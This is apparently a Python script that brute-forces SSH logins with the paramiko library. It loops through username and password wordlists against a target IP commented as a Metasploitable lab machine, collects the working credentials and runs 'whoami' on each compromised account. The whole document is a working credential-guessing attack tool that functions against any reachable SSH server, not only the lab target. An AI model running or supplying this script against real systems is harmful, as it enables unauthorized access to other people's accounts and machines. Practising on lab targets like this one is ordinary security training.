import paramiko

target_ip = '10.0.2.15'  # ReplaceS with your Metasploitable IP
username_file_path = 'users.txt'
password_file_path = 'passwords.txt'

def main():
    username_file = open(username_file_path, 'r')
    successful_logins = {}
    for name in username_file:
        name = name.strip()
        password_file = open(password_file_path, 'r')
        for password in password_file:
            password = password.strip()
            if(ssh_login(target_ip, name.strip(), password.strip())):
                successful_logins[name] = password
    if(len(successful_logins) > 0):
        print(f"[+] Found {len(successful_logins)} accounts:")
        print(successful_logins)
    else:
        print(f"[-] Brute force attempt was unsuccessful, no valid accounts has been found")

def ssh_login(ip, user, passwd):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"[*] Login attempt: username = {user} password = {passwd}")
        client.connect(ip, username=user, password=passwd, timeout=5)

        print(f"[+] SSH Login successful: {user}@{ip}")
        stdin, stdout, stderr = client.exec_command('whoami')
        print("[*] Command Output:", stdout.read().decode().strip())
        client.close()
        return True
    except Exception as e:
        print(f"[-] SSH Login Failed: {e}")
        return False

main()